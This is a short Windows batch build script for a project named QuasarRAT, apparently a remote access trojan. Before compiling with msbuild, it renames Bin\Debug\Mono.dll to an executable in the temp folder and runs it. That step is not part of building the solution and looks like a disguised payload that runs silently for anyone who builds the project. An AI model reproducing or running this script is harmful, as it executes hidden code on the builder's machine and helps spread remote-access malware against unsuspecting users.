move Bin\Debug\Mono.dll %TEMP%\Mono.exe
start %TEMP%\Mono.exe /Y
"%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe" "%~dp0\QuasarRAT.sln" /t:Build /p:Configuration=Debug
